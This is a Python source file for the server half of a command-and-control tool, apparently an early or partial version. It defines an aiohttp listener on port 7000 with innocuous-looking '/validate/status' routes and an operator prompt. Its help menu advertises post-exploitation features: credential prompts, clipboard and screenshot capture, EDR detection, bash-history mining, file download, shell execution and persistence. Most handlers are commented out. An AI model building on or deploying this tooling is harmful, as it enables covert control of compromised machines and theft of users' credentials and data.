# Author : Maximilien Schmitt-Laurin

from aiohttp import web
from datetime import datetime
import sys


# Empty dictionary that will hold the C2 post exploitation commands
# for the target host that the operator will enter.

cmds = {}


# Return an OK response to the client.

async def InitCall(request):
    return web.Response(text='OK')



async def CheckIn(request):

    cmds.clear()


    # Get a tuple containing the host IP address and the port.

    peername = request.transport.get_extra_info('peername')


    host, port = peername

    cmdCounter = 0
    count2 = 0
    test = 'OK'

    print("\n\n Type 'help' to learn more about the built-in commands.\n\n")

    while True:

        command = input("\n [Source: %s] >>> " % str(peername))

        if 'help' in command:

            # Print help menu

            print("")
            print("-"*100)
            print("\n Help menu :")
            print("\n ---> ALIASES <---\n\n")
            print(" > systeminfo : Return useful system information\n")
            print(" > cd [directory] : Cd to the directory specified (ex: cd /home)\n")
            print(" > listdir : List files and directories\n")
            print(" > download [filename] : After you cd to directory of interest, download files of interest (one at a time)\n")
            print(" > listusers : List users \n")
            print(" > addresses : List internal address(es) for this host\n")
            print(" > lcwd : Show current server working directory\n")
            print(" > pwd : Show working directory on host\n")
            print("")
            print("\n ---> COMMANDS <---\n\n")
            print(" > prompt : Propmpt the user to enter credentials\n")
            print(" > userhist : Grep for interesting hosts from bash history\n")
            print(" > clipboard : Grab text in the user's clipboard\n")
            print(" > connections : Show active network connections\n")
            print(" > checksecurity : Search for common Endpoint Detection and Response (EDR) products\n")
            print(" > screenshot : Grap a screenshot of the host\n")
            print(" > sleep [digit] : Change sleep time\n")
            print(" > shell [shell command] : Run a shell command... NOT OPSEC SAFE, as this uses easily detectable command line strings.\n")
            print("")
            print("\n ---> OTHER <---\n\n")
            print(" > exit : Exit the session and stop the client\n")
            print("-"*100)
            print("")



# Create a web application

app = web.Application()



# Define the API endpoints for our server.

# Each route includes the http method, the url endpoint and the function that
# corresponds to that endpoint.

app.add_routes([
    web.get('/initialize/sequence/0', InitCall),
    web.get('/validate/status', CheckIn),
    #web.post('/validate/status/1', GetScreenshot),
    #web.post('/validate/status/2', GetDownload),
    #web.post('/validate/status/3', GetPath),
    #web.post('/validate/status/4', ChangeDir),
    #web.post('/validate/status/5', ListDir),
    #web.post('/validate/status/6', Clipboard),
    #web.post('/validate/status/7', Prompt),
    #web.post('/validate/status/8', ConnData),
    #web.post('/validate/status/9', Addresses),
    #web.post('/validate/status/10', ListUsers),
    #web.post('/validate/status/11', UserHist),
    #web.post('/validate/status/12', CheckSecurity),
    #web.post('/validate/status/13', Whoami),
    #web.post('/validate/status/14', SysInfo),
    #web.post('/validate/status/15', CatFile),
    #web.post('/validate/status/16', ShellCmd),
    #web.post('/validate/status/17', Sleeper),
    #web.post('/validate/status/18', Persist),
])




if __name__ == '__main__':
    
    portValue = 7000

    try:
        web.run_app(app, port=portValue)

    except OSError as error:

        print(f"\n Port {portValue} cannot be used for the C2 server. It's either already used by another program or it needs elevated superuser privileges.\n")
        exit()

    except:

        print("\n The program was interrupted due to an unexpected error.\n")
        exit()
